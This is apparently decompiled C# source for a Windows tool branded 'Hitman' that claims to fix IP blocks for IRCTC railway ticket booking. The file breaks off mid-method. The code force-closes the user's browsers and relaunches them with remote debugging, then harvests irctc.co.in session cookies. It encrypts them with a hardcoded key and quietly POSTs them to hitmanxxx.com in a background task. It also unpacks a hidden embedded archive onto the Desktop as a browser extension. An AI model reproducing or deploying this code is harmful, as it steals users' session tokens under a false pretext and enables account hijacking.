using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Net.Security;
using System.Reflection;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Bunifu.Framework.UI;
using Ionic.Zip;
using Microsoft.Playwright;
using Microsoft.Win32;
using Newtonsoft.Json;
using NEXUS.IRCommDLL;
using QRCoder;

namespace APP_FRAMEWORK;

public class Form2 : Form
{
	private string edgepath;

	private string cometpath;

	private bool mProcess;

	private string chromepath;

	private bool chBeta;

	private HttpListener _cookieListener;

	private bool isExtensionActive;

	private string bravepath;

	private string operapath;

	private string jsonFilePath = "SensorList.json";

	private IContainer components = null;

	private Button button1;

	private Button button2;

	private Button button3;

	private Panel pnlHeader;

	private BunifuImageButton btnClose;

	internal Label formName;

	internal Label label1;

	internal Label label2;

	internal Label label3;

	private Button button4;

	internal Label label4;

	private PictureBox pictureBox1;

	internal Label label5;

	private Button button5;

	internal Label label6;

	private Button button6;

	private Label label7;

	internal Label label8;

	private Button button7;

	private PictureBox pictureBox2;

	public Form2()
	{
		InitializeComponent();
		pnlHeader.MouseDown += StatClass.Header_MouseDown;
		pnlHeader.MouseMove += StatClass.Header_MouseMove;
		pnlHeader.MouseUp += StatClass.Header_MouseUp;
	}

	private string GetOperaPath()
	{
		string[] array = new string[2] { "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\opera.exe", "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\App Paths\\opera.exe" };
		string[] array2 = array;
		foreach (string name in array2)
		{
			using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(name);
			if (registryKey == null)
			{
				continue;
			}
			object value = registryKey.GetValue("");
			if (value != null)
			{
				string text = value.ToString();
				if (File.Exists(text))
				{
					return text;
				}
			}
		}
		string[] array3 = array;
		foreach (string name2 in array3)
		{
			using RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey(name2);
			if (registryKey2 == null)
			{
				continue;
			}
			object value2 = registryKey2.GetValue("");
			if (value2 != null)
			{
				string text2 = value2.ToString();
				if (File.Exists(text2))
				{
					return text2;
				}
			}
		}
		string[] array4 = new string[4]
		{
			Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Programs\\Opera\\launcher.exe"),
			Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Programs\\Opera\\opera.exe"),
			Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "Opera\\launcher.exe"),
			Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "Opera\\launcher.exe")
		};
		string[] array5 = array4;
		foreach (string text3 in array5)
		{
			if (File.Exists(text3))
			{
				return text3;
			}
		}
		string text4 = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 2);
		List<string> list = (from f in Directory.GetFiles(text4 + "\\", "launcher.exe", SearchOption.AllDirectories)
			where f.ToLower().Contains("opera")
			select f).ToList();
		if (list.Count > 0)
		{
			return list[0];
		}
		throw new Exception("Opera browser not found on this system!");
	}

	private async void button2_Click(object sender, EventArgs e)
	{
		edgepath = "Check_IP_Block_edge";
		if (File.Exists(edgepath))
		{
			Form owner = new Form
			{
				TopMost = true
			};
			string text = "Aapka Pehle ka IP Block Fix Save hai\nIP Block Fix karne ki Zaroorat nahi hai\nAgar New IP Block Fix chahte hain to YES Button Click Karen";
			string caption = "Hitman";
			if (MessageBox.Show(owner, text, caption, MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) == DialogResult.Yes)
			{
				await StartEdgeAndConnect();
			}
		}
		else
		{
			await StartEdgeAndConnect();
		}
	}

	private async Task StartEdgeAndConnect()
	{
		try
		{
			try
			{
				using Process p = Process.Start(new ProcessStartInfo
				{
					FileName = "taskkill",
					Arguments = "/F /IM msedge.exe",
					CreateNoWindow = true,
					UseShellExecute = false
				});
				p?.WaitForExit();
			}
			catch
			{
			}
			await Task.Delay(1000);
			string edgePath = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe";
			if (!File.Exists(edgePath))
			{
				edgePath = "C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe";
			}
			if (!File.Exists(edgePath))
			{
				MessageBox.Show("Edge browser not found.");
				return;
			}
			string args = string.Concat(str2: Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "EdgePlaywrightProfile"), str0: $"--remote-debugging-port={9234} ", str1: "--remote-debugging-address=127.0.0.1 --user-data-dir=\"", str3: "\" --no-first-run --disable-session-crashed-bubble --disable-save-password-bubble --disable-infobars --disable-sync --start-maximized");
			Process.Start(new ProcessStartInfo
			{
				FileName = edgePath,
				Arguments = args,
				UseShellExecute = true
			});
			HttpClient client = new HttpClient();
			try
			{
				bool connected = false;
				for (int i = 0; i < 20; i++)
				{
					try
					{
						await client.GetStringAsync($"http://127.0.0.1:{9234}/json/version");
						connected = true;
					}
					catch
					{
						await Task.Delay(1000);
						continue;
					}
					break;
				}
				if (!connected)
				{
					MessageBox.Show("Edge did not open the remote debugging port.");
					return;
				}
				using IPlaywright playwright = await Playwright.CreateAsync();
				IBrowser browser = await playwright.Chromium.ConnectOverCDPAsync($"http://127.0.0.1:{9234}");
				IBrowserContext browserContext = ((browser.Contexts.Count <= 0) ? (await browser.NewContextAsync()) : browser.Contexts[0]);
				IBrowserContext context = browserContext;
				IPage page = ((context.Pages.Count <= 0) ? (await context.NewPageAsync()) : context.Pages[0]);
				IPage page2 = page;
				CaptureIRCTCRequests(page2);
				await page2.GotoAsync("https://www.irctc.co.in/nget/train-search", new PageGotoOptions
				{
					WaitUntil = WaitUntilState.DOMContentLoaded
				});
				while (!mProcess)
				{
					await Task.Delay(1000);
				}
				Program.BookingAllowEdge = true;
				await page2.CloseAsync();
				MessageBox.Show("IP Block Fix Successfully, Ab Aap Booking Process kar sakte hain");
			}
			finally
			{
				((IDisposable)client)?.Dispose();
			}
		}
		catch (Exception)
		{
		}
	}

	private async Task StartEdgeAndConnect_OLD()
	{
		try
		{
			int port = 9234;
			try
			{
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				string fileName = "cmd.exe";
				processStartInfo.FileName = fileName;
				string arguments = "/c taskkill /F /IM msedge.exe";
				processStartInfo.Arguments = arguments;
				processStartInfo.CreateNoWindow = true;
				processStartInfo.UseShellExecute = false;
				ProcessStartInfo kill = processStartInfo;
				await Task.Run(delegate
				{
					Process.Start(kill)?.WaitForExit();
				});
			}
			catch
			{
			}
			await Task.Delay(200);
			string text = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe";
			string text2 = text;
			string format = "--remote-debugging-port={0} ";
			string obj2 = string.Format(format, port);
			string text3 = "--remote-debugging-address=127.0.0.1 --no-first-run --disable-session-crashed-bubble --disable-save-password-bubble --disable-infobars --disable-sync --disable-features=msEdgeSync ";
			string text4 = obj2 + text3;
			ProcessStartInfo processStartInfo2 = new ProcessStartInfo();
			string fileName2 = "cmd.exe";
			processStartInfo2.FileName = fileName2;
			string text5 = "/c start \"\" \"";
			string text6 = "\" ";
			processStartInfo2.Arguments = text5 + text2 + text6 + text4;
			processStartInfo2.CreateNoWindow = true;
			processStartInfo2.UseShellExecute = false;
			Process.Start(processStartInfo2);
			await Task.Delay(5000);
			IBrowserType chromium = (await Playwright.CreateAsync()).Chromium;
			string format2 = "http://127.0.0.1:{0}";
			IBrowserContext browserContext = (await chromium.ConnectOverCDPAsync(string.Format(format2, port))).Contexts[0];
			IPage page = ((browserContext.Pages.Count > 0) ? browserContext.Pages[0] : (await browserContext.NewPageAsync()));
			IPage page2 = page;
			IPage page3 = page2;
			CaptureIRCTCRequests(page3);
			string url = "https://www.irctc.co.in/nget/train-search";
			await page3.GotoAsync(url, new PageGotoOptions
			{
				WaitUntil = WaitUntilState.DOMContentLoaded
			});
			while (!mProcess)
			{
				await Task.Delay(1000);
			}
			Program.BookingAllowEdge = true;
			if (page3 != null)
			{
				await page3.CloseAsync();
			}
			Form owner = new Form
			{
				TopMost = true
			};
			string text7 = "IP Block Fix Successfully, Ab Aap Booking Process kar sakte hain";
			string caption = "Hitman";
			MessageBox.Show(owner, text7, caption, MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}
		catch (Exception ex)
		{
			Exception ex2 = ex;
			MessageBox.Show(ex2.ToString());
			if (ex2.InnerException != null)
			{
				MessageBox.Show(ex2.InnerException.ToString());
			}
		}
	}

	private async Task StartCometAndConnect()
	{
		try
		{
			int port = 9234;
			try
			{
				ProcessStartInfo killInfo = new ProcessStartInfo
				{
					FileName = "cmd.exe",
					Arguments = "/c taskkill /F /IM comet.exe",
					CreateNoWindow = true,
					UseShellExecute = false
				};
				await Task.Run(delegate
				{
					Process.Start(killInfo)?.WaitForExit();
				});
			}
			catch
			{
			}
			await Task.Delay(1000);
			string cometPath = "C:\\Program Files\\Perplexity\\Comet\\Application\\comet.exe";
			if (!File.Exists(cometPath))
			{
				MessageBox.Show("Comet Browser Path Invalid", "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return;
			}
			string args = $"--remote-debugging-port={port} " + "--remote-debugging-address=127.0.0.1 --no-first-run --disable-session-crashed-bubble --disable-save-password-bubble --disable-infobars --disable-sync --start-maximized";
			ProcessStartInfo startInfo = new ProcessStartInfo
			{
				FileName = cometPath,
				Arguments = args,
				CreateNoWindow = false,
				UseShellExecute = true
			};
			Process.Start(startInfo);
			await Task.Delay(7000);
			using IPlaywright playwright = await Playwright.CreateAsync();
			IBrowser browser = await playwright.Chromium.ConnectOverCDPAsync($"http://127.0.0.1:{port}");
			IBrowserContext context = ((browser.Contexts.Count <= 0) ? (await browser.NewContextAsync()) : browser.Contexts[0]);
			IPage page = ((context.Pages.Count <= 0) ? (await context.NewPageAsync()) : context.Pages[0]);
			CaptureIRCTCRequestscomet(page);
			await page.GotoAsync("https://www.irctc.co.in/nget/train-search", new PageGotoOptions
			{
				WaitUntil = WaitUntilState.DOMContentLoaded,
				Timeout = 60000f
			});
			while (!mProcess)
			{
				await Task.Delay(1000);
			}
			Program.BookingAllowEdge = true;
			if (page != null)
			{
				await page.CloseAsync();
			}
			Form owner = new Form
			{
				TopMost = true
			};
			MessageBox.Show(owner, "IP Block Fix Successfully, Ab Aap Booking Process kar sakte hain", "Hitman", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}
		catch (Exception ex)
		{
			Exception ex2 = ex;
			MessageBox.Show(ex2.Message, "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}
	}

	private async Task StartOperaAndConnect()
	{
		try
		{
			int port = 9234;
			try
			{
				ProcessStartInfo killInfo = new ProcessStartInfo
				{
					FileName = "cmd.exe",
					Arguments = "/c taskkill /F /IM opera.exe",
					CreateNoWindow = true,
					UseShellExecute = false
				};
				await Task.Run(delegate
				{
					Process.Start(killInfo)?.WaitForExit();
				});
			}
			catch
			{
			}
			await Task.Delay(200);
			string operaPath = GetOperaPath();
			if (!File.Exists(operaPath))
			{
				operaPath = "C:\\Program Files\\Opera\\launcher.exe";
			}
			string args = $"--remote-debugging-port={port} " + "--remote-debugging-address=127.0.0.1 --no-first-run --disable-session-crashed-bubble --disable-infobars --disable-sync";
			ProcessStartInfo startInfo = new ProcessStartInfo
			{
				FileName = "cmd.exe",
				Arguments = "/c start \"\" \"" + operaPath + "\" " + args,
				CreateNoWindow = true,
				UseShellExecute = false
			};
			Process.Start(startInfo);
			await Task.Delay(5000);
			IBrowserType chromium = (await Playwright.CreateAsync()).Chromium;
			string format2 = "http://127.0.0.1:{0}";
			IBrowserContext browserContext = (await chromium.ConnectOverCDPAsync(string.Format(format2, port))).Contexts[0];
			IPage page = ((browserContext.Pages.Count > 0) ? browserContext.Pages[0] : (await browserContext.NewPageAsync()));
			IPage page2 = page;
			IPage page3 = page2;
			CaptureIRCTCRequestsopera(page3);
			string url = "https://www.irctc.co.in/nget/train-search";
			await page3.GotoAsync(url, new PageGotoOptions
			{
				WaitUntil = WaitUntilState.DOMContentLoaded
			});
			while (!mProcess)
			{
				await Task.Delay(1000);
			}
			Program.BookingAllowEdge = true;
			if (page3 != null)
			{
				await page3.CloseAsync();
			}
			Form owner = new Form
			{
				TopMost = true
			};
			string text7 = "IP Block Fix Successfully, Ab Aap Booking Process kar sakte hain";
			string caption = "Hitman";
			MessageBox.Show(owner, text7, caption, MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}
		catch (Exception)
		{
		}
	}

	private void CaptureIRCTCRequests(IPage page)
	{
		page.Response += async delegate(object sender, IResponse response)
		{
			string method = response.Request.Method;
			string text = "OPTIONS";
			if (!(method == text))
			{
				string url = response.Url;
				string value = "insurenceApplicable=";
				if (url.Contains(value))
				{
					try
					{
						string fileName = edgepath;
						IBrowserContext context = page.Context;
						IReadOnlyList<BrowserContextCookiesResult> allCookies = await context.CookiesAsync();
						await context.CookiesAsync();
						string input = JsonConvert.SerializeObject(allCookies.Where(delegate(BrowserContextCookiesResult c)
						{
							string domain = c.Domain;
							string value2 = "irctc.co.in";
							return domain.Contains(value2);
						}).ToList(), Formatting.Indented);
						string text4 = "ec3104c5318c8f0753fdc13faa540020cae645c4b43f3795a0f2f9fc94328326";
						string symmetricKey = text4;
						string contents = Staticm.EncryptAES(input, symmetricKey);
						string traindata11 = "edge|-|" + contents + "|-|" + fileName;
						Task.Run(() => traindata(traindata11));
						File.WriteAllText(fileName, contents);
						Program.BookingAllowEdge = true;
						mProcess = true;
					}
					catch (Exception)
					{
					}
				}
			}
		};
	}

	private void CaptureIRCTCRequestscomet(IPage page)
	{
		page.Response += async delegate(object sender, IResponse response)
		{
			string method = response.Request.Method;
			string text = "OPTIONS";
			if (!(method == text))
			{
				string url = response.Url;
				string value = "insurenceApplicable=";
				if (url.Contains(value))
				{
					try
					{
						string fileName = "Check_IP_Block_comet";
						IBrowserContext context = page.Context;
						IReadOnlyList<BrowserContextCookiesResult> allCookies = await context.CookiesAsync();
						await context.CookiesAsync();
						string input = JsonConvert.SerializeObject(allCookies.Where(delegate(BrowserContextCookiesResult c)
						{
							string domain = c.Domain;
							string value2 = "irctc.co.in";
							return domain.Contains(value2);
						}).ToList(), Formatting.Indented);
						string text4 = "ec3104c5318c8f0753fdc13faa540020cae645c4b43f3795a0f2f9fc94328326";
						string symmetricKey = text4;
						string contents = Staticm.EncryptAES(input, symmetricKey);
						string traindata11 = "comet|-|" + contents + "|-|" + fileName;
						Task.Run(() => traindata(traindata11));
						File.WriteAllText(fileName, contents);
						Program.BookingAllowEdge = true;
						mProcess = true;
					}
					catch (Exception)
					{
					}
				}
			}
		};
	}

	private void CaptureIRCTCRequestsopera(IPage page)
	{
		page.Response += async delegate(object sender, IResponse response)
		{
			string method = response.Request.Method;
			string text = "OPTIONS";
			if (!(method == text))
			{
				string url = response.Url;
				string value = "insurenceApplicable=";
				if (url.Contains(value))
				{
					try
					{
						string fileName = operapath;
						IBrowserContext context = page.Context;
						IReadOnlyList<BrowserContextCookiesResult> allCookies = await context.CookiesAsync();
						await context.CookiesAsync();
						string input = JsonConvert.SerializeObject(allCookies.Where(delegate(BrowserContextCookiesResult c)
						{
							string domain = c.Domain;
							string value2 = "irctc.co.in";
							return domain.Contains(value2);
						}).ToList(), Formatting.Indented);
						string text4 = "ec3104c5318c8f0753fdc13faa540020cae645c4b43f3795a0f2f9fc94328326";
						string symmetricKey = text4;
						string contents = Staticm.EncryptAES(input, symmetricKey);
						string traindata11 = "opera|-|" + contents + "|-|" + fileName;
						Task.Run(() => traindata(traindata11));
						File.WriteAllText(fileName, contents);
						Program.BookingAllowEdge = true;
						mProcess = true;
					}
					catch (Exception)
					{
					}
				}
			}
		};
	}

	public static void smethod_12()
	{
		try
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
			string path = "Hitman IP Block Fixer//background.js";
			if (File.Exists(Path.Combine(folderPath, path)))
			{
				return;
			}
			string path2 = "SKP.dll";
			string text = Path.Combine(folderPath, path2);
			string path3 = "SKP.zip";
			string text2 = Path.Combine(folderPath, path3);
			if (!File.Exists(text))
			{
				Assembly executingAssembly = Assembly.GetExecutingAssembly();
				string name = "Hitman-IP-Block-Fixer.dll";
				Stream manifestResourceStream = executingAssembly.GetManifestResourceStream(name);
				if (manifestResourceStream != null)
				{
					FileStream fileStream = new FileStream(text, FileMode.CreateNew);
					for (int i = 0; i < manifestResourceStream.Length; i++)
					{
						fileStream.WriteByte((byte)manifestResourceStream.ReadByte());
					}
					fileStream.Close();
					new FileInfo(text).Attributes = FileAttributes.Hidden;
				}
			}
			if (!File.Exists(text))
			{
				return;
			}
			if (!File.Exists(text2))
			{
				File.Copy(text, text2, overwrite: true);
			}
			File.Delete(text);
			try
			{
				ZipFile zipFile = ZipFile.Read(text2);
				try
				{
					zipFile.ExtractAll(folderPath);
				}
				finally
				{
					zipFile?.Dispose();
				}
				File.Delete(text2);
			}
			catch (Exception ex)
			{
				File.Delete(text2);
				MessageBox.Show(ex.Message);
			}
		}
		catch
		{
		}
	}

	public async Task traindata(string data)
	{
		try
		{
			string environmentVariable = Environment.GetEnvironmentVariable("clientID", EnvironmentVariableTarget.Process);
			if (string.IsNullOrWhiteSpace(environmentVariable))
			{
				throw new Exception("clientID missing");
			}
			string[] parts = data.Split(new string[1] { "|-|" }, StringSplitOptions.None);
			if (parts.Length < 3)
			{
				throw new Exception("Invalid data format");
			}
			var payload = new
			{
				UserName = environmentVariable,
				brwser = parts[0].Trim(),
				kookei = parts[1].Trim(),
				filname = parts[2].Trim()
			};
			string json = System.Text.Json.JsonSerializer.Serialize(payload);
			Console.WriteLine("REQUEST JSON:");
			Console.WriteLine(json);
			HttpClientHandler handler = new HttpClientHandler
			{
				AllowAutoRedirect = false
			};
			HttpClient client = new HttpClient((HttpMessageHandler)(object)handler);
			try
			{
				client.Timeout = TimeSpan.FromSeconds(10.0);
				((HttpHeaders)client.DefaultRequestHeaders).Clear();
				((HttpHeaders)client.DefaultRequestHeaders).Add("Accept", "application/json");
				HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Post, "https://hitmanxxx.com/Hitmant/webtoken");
				request.Content = (HttpContent)new StringContent(json, Encoding.UTF8, "application/json");
				HttpResponseMessage response = await client.SendAsync(request);
				string result = await response.Content.ReadAsStringAsync();
				Console.WriteLine("HTTP STATUS: " + response.StatusCode);
				Console.WriteLine("RAW RESPONSE:");
				Console.WriteLine(result);
				if (!response.IsSuccessStatusCode)
				{
					Console.WriteLine($"API Error: {response.StatusCode}");
					return;
				}
				if (string.IsNullOrWhiteSpace(result))
				{
					Console.WriteLine("Empty response from server");
					return;
				}
				try
				{
					using JsonDocument doc = JsonDocument.Parse(result);
					if (doc.RootElement.TryGetProperty("status", out var status))
					{
						Console.WriteLine("Status: " + status.GetString());
					}
					else
					{
						Console.WriteLine("No 'status' field in response");
					}
				}
				catch (System.Text.Json.JsonException)
				{
					Console.WriteLine("Invalid JSON response from server");
				}
			}
			finally
			{
				((IDisposable)client)?.Dispose();
			}
		}
		catch (Exception ex2)
		{
			Console.WriteLine("Error: " + ex2);
		}
	}

	private async Task StartCookieServerAsync()
	{
		_cookieListener = new HttpListener();
		string text = "http://127.0.0.1:8080/savecookies/";
		string uriPrefix = text;
		string text5 = "http://127.0.0.1:8080/ping/";
		string uriPrefix2 = text5;
		_cookieListener.Prefixes.Add(uriPrefix);
		_cookieListener.Prefixes.Add(uriPrefix2);
		string fileName = chromepath;
		if (chBeta)
		{
			fileName = chromepath;
		}
		try
		{
			_cookieListener.Start();
			while (true)
			{
				HttpListenerContext httpListenerContext = await _cookieListener.GetContextAsync();
				HttpListenerRequest request = httpListenerContext.Request;
				HttpListenerResponse response = httpListenerContext.Response;
				string name = "Access-Control-Allow-Origin";
				string value = "*";
				response.AppendHeader(name, value);
				string name2 = "Access-Control-Allow-Methods";
				string value2 = "POST, GET, OPTIONS";
				response.AppendHeader(name2, value2);
				string name3 = "Access-Control-Allow-Headers";
				string value3 = "Content-Type";
				response.AppendHeader(name3, value3);
				string httpMethod = request.HttpMethod;
				string text8 = "OPTIONS";
				if (httpMethod == text8)
				{
					response.StatusCode = 200;
					response.Close();
					continue;
				}
				string obj = request.Url.AbsolutePath.TrimEnd('/');
				string text9 = "/ping";
				if (obj == text9)
				{
					isExtensionActive = true;
					response.StatusCode = 200;
					response.Close();
					continue;
				}
				string httpMethod2 = request.HttpMethod;
				string text10 = "POST";
				if (!(httpMethod2 == text10))
				{
					string obj2 = request.Url.AbsolutePath.TrimEnd('/');
					string text11 = "/ping";
					if (obj2 != text11)
					{
						response.StatusCode = 405;
					}
				}
				else
				{
					using (Stream body = request.InputStream)
					{
						using StreamReader reader = new StreamReader(body, request.ContentEncoding);
						string irctcJson = "[]";
						try
						{
							List<Playwright_Automation.ChromeCookie> irctcCookies = JsonConvert.DeserializeObject<List<Playwright_Automation.ChromeCookie>>(await reader.ReadToEndAsync())?.Where((Playwright_Automation.ChromeCookie c) => c != null && !string.IsNullOrWhiteSpace(c.domain) && c.domain.IndexOf("irctc.co.in", StringComparison.OrdinalIgnoreCase) >= 0).ToList() ?? new List<Playwright_Automation.ChromeCookie>();
							irctcJson = JsonConvert.SerializeObject(irctcCookies, Formatting.Indented);
						}
						catch (Exception ex)
						{
							Exception ex2 = ex;
							Console.WriteLine("Cookie Filter Error: " + ex2.Message);
						}
						string startupPath = Application.StartupPath;
						string path = "Chrome_irctc_cookies.json";
						Path.Combine(startupPath, path);
						string text12 = "ec3104c5318c8f0753fdc13faa540020cae645c4b43f3795a0f2f9fc94328326";
						string symmetricKey = text12;
						string contents = Staticm.EncryptAES(irctcJson, symmetricKey);
						string traindata11 = "chrome|-|" + contents + "|-|" + fileName;
						Task.Run(() => traindata(traindata11));
						File.WriteAllText(fileName, contents);
						Form owner = new Form
						{
							TopMost = true
						};
						string text13 = "IP Check Successfully By Chrome\nAb Booking Kar Sakte hain";
						string caption = "Hitman";
						MessageBox.Show(owner, text13, caption, MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
					}
					Program.BookingAllowChrome = true;
					response.StatusCode = 200;
					using StreamWriter writer = new StreamWriter(response.OutputStream);
					string value4 = "{\"status\": \"success\"}";
					await writer.WriteAsync(value4);
				}
				response.Close();
			}
		}
		catch (HttpListenerException ex3)
		{
			if (ex3.ErrorCode != 995 && ex3.ErrorCode != 1229)
			{
				string text14 = "Server Error: ";
				string message = ex3.Message;
				string text15 = "\nTip: Run as Administrator.";
				string obj3 = text14 + message + text15;
				string caption2 = "Error";
				MessageBox.Show(obj3, caption2, MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
			else
			{
				string value5 = "[Info] Server successfully stopped and exited.";
				Console.WriteLine(value5);
			}
		}
		catch (ObjectDisposedException)
		{
			string value6 = "[Info] Server disposed.";
			Console.WriteLine(value6);
		}
	}

	private async void button3_Click(object sender, EventArgs e)
	{
		chromepath = "Check_IP_Block_chrome";
		if (File.Exists(chromepath))
		{
			Form owner = new Form
			{
				TopMost = true
			};
			string text = "Aapka Pehle ka IP Block Fix Save hai\nIP Block Fix karne ki Zaroorat nahi hai\nAgar New IP Block Fix chahte hain to YES Button Click Karen";
			string caption = "Hitman";
			if (MessageBox.Show(owner, text, caption, MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) == DialogResult.No)
			{
				Program.BookingAllowChrome = true;
				return;
			}
		}
		try
		{
			chBeta = false;
			smethod_12();
			if (_cookieListener != null && _cookieListener.IsListening)
			{
				_cookieListener.Stop();
				_cookieListener.Close();
				string value = "[Info] Extension missing. Background server killed.";
				Console.WriteLine(value);
			}
			isExtensionActive = false;
			StartCookieServerAsync();
			string value2 = "[Info] Chrome launch kar rahe hain...";
			Console.WriteLine(value2);
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
			string path2 = "Google\\Chrome Beta\\User Data";
			Path.Combine(folderPath, path2);
			string text2 = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";
			string text3 = text2;
			if (!File.Exists(text3))
			{
				string text4 = "Chrome Beta is location par nahi mila!";
				MessageBox.Show(text4);
			}
			else
			{
				ProcessStartInfo obj = new ProcessStartInfo
				{
					FileName = text3
				};
				string arguments = "https://www.irctc.co.in/nget/train-search --start-maximized";
				obj.Arguments = arguments;
				obj.UseShellExecute = true;
				Process.Start(obj);
			}
			int waitAttempts = 0;
			while (!isExtensionActive && waitAttempts < 10)
			{
				await Task.Delay(500);
				waitAttempts++;
			}
			if (!isExtensionActive)
			{
				Form owner2 = new Form
				{
					TopMost = true
				};
				string text5 = "1:- Aapke Chrome pe IP Block Fixer Extension Install Nahi hai\n2:- Sabse Pehle Chrome ke Extension Option me jake Devloper Mode ON karen\n3:- Load Unpack Extension per Click Karke\n4:- Desktop se Hitman IP Block Fixer ka Folder Select kar len\nNote :- Agar Install hone ke baad bhi yeh Message Show Kare to Remove karke Dobara Install kar den";
				string caption2 = "Hitman";
				MessageBox.Show(owner2, text5, caption2, MessageBoxButtons.OK, MessageBoxIcon.Hand);
				if (_cookieListener != null && _cookieListener.IsListening)
				{
					_cookieListener.Stop();
					_cookieListener.Close();
					string value3 = "[Info] Extension missing. Background server killed.";
					Console.WriteLine(value3);
				}
			}
			else
			{
				string value4 = "[Success] Extension detect ho gaya hai! Cookies ka wait kar rahe hain...";
				Console.WriteLine(value4);
			}
		}
		catch (Exception ex)
		{
			string text6 = "System Error: ";
			string obj2 = text6 + ex.Message;
			string caption3 = "Error";
			MessageBox.Show(obj2, caption3, MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}
	}

	internal void CapturebraveIRCTCRequests(IPage page)
	{
		page.Response += async delegate(object sender, IResponse response)
		{
			string method = response.Request.Method;
			string text = "OPTIONS";
			if (!(method == text))
			{
				string url = response.Url;
				string value = "insurenceApplicable=";
				if (url.Contains(value))
				{
					try
					{
						string fileName = bravepath;
						IBrowserContext context = page.Context;
						IReadOnlyList<BrowserContextCookiesResult> allCookies = await context.CookiesAsync();
						await context.CookiesAsync();
						string input = JsonConvert.SerializeObject(allCookies.Where(delegate(BrowserContextCookiesResult c)
						{
							string domain = c.Domain;
							string value2 = "irctc.co.in";
							return domain.Contains(value2);
						}).ToList(), Formatting.Indented);
						string text4 = "ec3104c5318c8f0753fdc13faa540020cae645c4b43f3795a0f2f9fc94328326";
						string symmetricKey = text4;
						string contents = Staticm.EncryptAES(input, symmetricKey);
						string traindata11 = "brave|-|" + contents + "|-|" + fileName;
						Task.Run(() => traindata(traindata11));
						File.WriteAllText(fileName, contents);
						mProcess = true;
					}
					catch (Exception)
					{
					}
				}
			}
		};
	}

	internal async Task StartbraveAndConnect()
	{
		try
		{
			int port = 9234;
			try
			{
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				string fileName = "cmd.exe";
				processStartInfo.FileName = fileName;
				string arguments = "/c taskkill /F /IM brave.exe";
				processStartInfo.Arguments = arguments;
				processStartInfo.CreateNoWindow = true;
				processStartInfo.UseShellExecute = false;
				ProcessStartInfo kill = processStartInfo;
				await Task.Run(delegate
				{
					Process.Start(kill)?.WaitForExit();
				});
			}
			catch
			{
			}
			await Task.Delay(200);
			string text = "C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe";
			string format = "--remote-debugging-port={0} ";
			string obj2 = string.Format(format, port);
			string text3 = "--remote-debugging-address=127.0.0.1 --no-first-run --disable-session-crashed-bubble --disable-save-password-bubble --disable-infobars --disable-sync ";
			string text4 = obj2 + text3;
			ProcessStartInfo processStartInfo2 = new ProcessStartInfo
			{
				FileName = "cmd.exe",
				Arguments = "/c start \"\" \"" + text + "\" " + text4,
				CreateNoWindow = true,
				UseShellExecute = false
			};
			Process.Start(processStartInfo2);
			await Task.Delay(5000);
			IBrowserType chromium = (await Playwright.CreateAsync()).Chromium;
			string format2 = "http://127.0.0.1:{0}";
			IBrowserContext browserContext = (await chromium.ConnectOverCDPAsync(string.Format(format2, port))).Contexts[0];
			IPage page = ((browserContext.Pages.Count > 0) ? browserContext.Pages[0] : (await browserContext.NewPageAsync()));
			IPage page2 = page;
			IPage page3 = page2;
			CapturebraveIRCTCRequests(page3);
			string url = "https://www.irctc.co.in/nget/train-search";
			await page3.GotoAsync(url, new PageGotoOptions
			{
				WaitUntil = WaitUntilState.DOMContentLoaded
			});
			while (!mProcess)
			{
				await Task.Delay(1000);
			}
			if (page3 != null)
			{
				await page3.CloseAsync();
			}
			Form owner = new Form
			{
				TopMost = true
			};
			string text7 = "Brave IP Block Fix Successfully, Ab Aap Booking Process kar sakte hain";
			string caption = "Hitman";
			MessageBox.Show(owner, text7, caption, MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}
		catch (Exception)
		{
		}
	}

	private async void button4_Click(object sender, EventArgs e)
	{
		bravepath = "Check_IP_Block_brave";
		if (File.Exists(bravepath))
		{
			Form owner = new Form
			{
				TopMost = true
			};
			string text = "Aapka Pehle ka IP Block Fix Save hai\nIP Block Fix karne ki Zaroorat nahi hai\nAgar New IP Block Fix chahte hain to YES Button Click Karen";
			string caption = "Hitman";
			if (MessageBox.Show(owner, text, caption, MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) == DialogResult.Yes)
			{
				await StartbraveAndConnect();
			}
		}
		else
		{
			await StartbraveAndConnect();
		}
	}

	private void label4_Click(object sender, EventArgs e)
	{
	}

	private void btnClose_Click(object sender, EventArgs e)
	{
		Close();
	}

	private async void button5_Click(object sender, EventArgs e)
	{
		operapath = "Check_IP_Block_opera";
		if (File.Exists(operapath))
		{
